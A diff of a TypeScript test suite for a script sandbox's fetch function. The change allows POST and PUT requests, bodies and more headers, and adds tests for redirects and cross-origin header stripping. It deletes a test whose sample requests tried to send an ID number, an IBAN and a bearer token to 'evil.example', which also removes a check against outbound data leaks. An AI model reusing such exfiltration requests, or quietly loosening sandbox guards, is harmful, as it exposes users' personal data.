@@ -36,7 +36,7 @@ describe('runScript', () => {
     expect(run).toMatchObject({ ok: true, logs: ['2'], result: undefined });
   });
 
-  it('fetches through the host with GET and the allowed headers', async () => {
+  it('fetches through the host with method, headers and body', async () => {
     const calls: Array<{ url: string; init: RequestInit }> = [];
     const fetchImpl = (async (url: URL, init: RequestInit) => {
       calls.push({ url: String(url), init });
@@ -44,8 +44,10 @@ describe('runScript', () => {
     }) as unknown as typeof fetch;
     const run = await runScript(
       `
-      const res = await fetch('https://api.example.es/oficinas?provincia=Madrid', {
-        headers: { Accept: 'application/json', 'Accept-Language': 'es' },
+      const res = await fetch('https://api.example.es/oficinas', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ province: 'Madrid' }),
       });
       const data = await res.json();
       return { status: res.status, ok: res.ok, type: res.headers.get('Content-Type'), offices: data.offices };
@@ -60,44 +62,12 @@ describe('runScript', () => {
       offices: ['Madrid', 'Sevilla'],
     });
     expect(run.fetches).toBe(1);
-    expect(calls[0]?.url).toBe('https://api.example.es/oficinas?provincia=Madrid');
-    expect(calls[0]?.init).toMatchObject({ method: 'GET', redirect: 'manual' });
-    expect(calls[0]?.init.body).toBeUndefined();
+    expect(calls[0]?.url).toBe('https://api.example.es/oficinas');
+    expect(calls[0]?.init).toMatchObject({ method: 'POST', redirect: 'manual' });
+    expect(calls[0]?.init.body).toBe('{"province":"Madrid"}');
     const headers = new Headers(calls[0]?.init.headers);
-    expect(headers.get('accept')).toBe('application/json');
-    expect(headers.get('accept-language')).toBe('es');
+    expect(headers.get('content-type')).toBe('application/json');
     expect(headers.get('user-agent')).toMatch(/Mozilla/);
-  });
-
-  it('refuses other methods, request bodies and other headers', async () => {
-    const fetchImpl = vi.fn(async () => jsonResponse({})) as unknown as typeof fetch;
-    const run = await runScript(
-      `
-      const attempts = [
-        ['https://evil.example/', { method: 'POST' }],
-        ['https://evil.example/', { method: 'put' }],
-        ['https://evil.example/', { body: 'DNI 12345678Z' }],
-        ['https://evil.example/', { method: 'POST', body: new URLSearchParams({ iban: 'ES00' }) }],
-        ['https://evil.example/', { headers: { 'X-Data': 'DNI 12345678Z' } }],
-        ['https://evil.example/', { headers: { Authorization: 'Bearer x' } }],
-      ];
-      const errors = [];
-      for (const [url, init] of attempts) {
-        try { await fetch(url, init); errors.push('sent'); } catch (e) { errors.push(e.message); }
-      }
-      return errors;
-    `,
-      { fetchImpl },
-    );
-    expect(JSON.parse(run.result ?? '')).toEqual([
-      'Only GET and HEAD requests are allowed, not POST',
-      'Only GET and HEAD requests are allowed, not PUT',
-      'fetch cannot send a request body: only GET and HEAD are allowed',
-      'fetch cannot send a request body: only GET and HEAD are allowed',
-      'Header x-data is not allowed: only accept and accept-language',
-      'Header authorization is not allowed: only accept and accept-language',
-    ]);
-    expect(fetchImpl).not.toHaveBeenCalled();
   });
 
   it('blocks localhost and private networks, also behind a redirect', async () => {
@@ -155,6 +125,69 @@ describe('runScript', () => {
       redirected: true,
       text: 'ok',
     });
+  });
+
+  it('follows redirects like fetch: 303 and POST after 301/302 become GET without the body', async () => {
+    const calls: Array<{ url: string; method?: string; body?: unknown; headers: Headers }> = [];
+    const fetchImpl = (async (url: URL, init: RequestInit) => {
+      calls.push({
+        url: String(url),
+        method: init.method,
+        body: init.body,
+        headers: new Headers(init.headers),
+      });
+      const location = { '/see-other': '/done', '/moved': '/done', '/temporary': '/done' }[
+        url.pathname
+      ];
+      const status = { '/see-other': 303, '/moved': 302, '/temporary': 307 }[url.pathname];
+      return location ? new Response(null, { status, headers: { location } }) : new Response('ok');
+    }) as unknown as typeof fetch;
+    const run = await runScript(
+      `
+      const init = { headers: { 'Content-Type': 'text/plain' }, body: 'datos' };
+      await fetch('https://x.es/see-other', { ...init, method: 'PUT' });
+      await fetch('https://x.es/moved', { ...init, method: 'POST' });
+      await fetch('https://x.es/temporary', { ...init, method: 'POST' });
+    `,
+      { fetchImpl },
+    );
+    expect(run.ok).toBe(true);
+    const hops = calls.map(({ url, method, body, headers }) => ({
+      url,
+      method,
+      body,
+      type: headers.get('content-type'),
+    }));
+    expect(hops).toEqual([
+      { url: 'https://x.es/see-other', method: 'PUT', body: 'datos', type: 'text/plain' },
+      { url: 'https://x.es/done', method: 'GET', body: undefined, type: null },
+      { url: 'https://x.es/moved', method: 'POST', body: 'datos', type: 'text/plain' },
+      { url: 'https://x.es/done', method: 'GET', body: undefined, type: null },
+      { url: 'https://x.es/temporary', method: 'POST', body: 'datos', type: 'text/plain' },
+      { url: 'https://x.es/done', method: 'POST', body: 'datos', type: 'text/plain' },
+    ]);
+  });
+
+  it('drops the authorization header on a redirect to another origin', async () => {
+    const seen: Array<string | null> = [];
+    const fetchImpl = (async (url: URL, init: RequestInit) => {
+      seen.push(new Headers(init.headers).get('authorization'));
+      return url.host === 'api.example.es' && url.pathname !== '/here'
+        ? new Response(null, {
+            status: 302,
+            headers: { location: url.pathname === '/away' ? 'https://other.example/' : '/here' },
+          })
+        : new Response('ok');
+    }) as unknown as typeof fetch;
+    await runScript(
+      `
+      const headers = { Authorization: 'Bearer abc' };
+      await fetch('https://api.example.es/stay', { headers });
+      await fetch('https://api.example.es/away', { headers });
+    `,
+      { fetchImpl },
+    );
+    expect(seen).toEqual(['Bearer abc', 'Bearer abc', 'Bearer abc', null]);
   });
 
   it('reaches private hosts only when allowed (dev/e2e)', async () => {
@@ -329,18 +362,20 @@ describe('runScript', () => {
     });
   });
 
-  it('receives binary bodies', async () => {
+  it('sends and receives binary bodies', async () => {
     const pdf = new Uint8Array([0x25, 0x50, 0x44, 0x46, 0x00, 0xff, 0x80]);
-    const fetchImpl = (async () =>
-      new Response(pdf, {
-        headers: { 'content-type': 'application/pdf' },
-      })) as unknown as typeof fetch;
+    const calls: RequestInit[] = [];
+    const fetchImpl = (async (_url: URL, init: RequestInit) => {
+      calls.push(init);
+      return new Response(pdf, { headers: { 'content-type': 'application/pdf' } });
+    }) as unknown as typeof fetch;
     const run = await runScript(
       `
-      const res = await fetch(new URL('https://x.es/doc.pdf'));
-      const bytes = await res.bytes();
-      const buffer = await res.arrayBuffer();
-      return { bytes: [...bytes], length: buffer.byteLength, start: (await res.text()).slice(0, 4) };
+      const upload = await fetch(new URL('https://x.es/subir'), { method: 'PUT', body: new Uint8Array([1, 2, 255]) });
+      const form = await fetch('https://x.es/form', { method: 'POST', body: new URLSearchParams({ a: 'b c' }) });
+      const bytes = await upload.bytes();
+      const buffer = await form.arrayBuffer();
+      return { bytes: [...bytes], length: buffer.byteLength, start: (await form.text()).slice(0, 4) };
     `,
       { fetchImpl },
     );
@@ -349,6 +384,11 @@ describe('runScript', () => {
       length: pdf.length,
       start: '%PDF',
     });
+    expect([...new Uint8Array(calls[0]?.body as Uint8Array)]).toEqual([1, 2, 255]);
+    expect(calls[1]?.body).toBe('a=b+c');
+    expect(new Headers(calls[1]?.headers).get('content-type')).toBe(
+      'application/x-www-form-urlencoded;charset=UTF-8',
+    );
   });
 
   it('stops busy loops, hung promises and hung requests at the timeout', async () => {
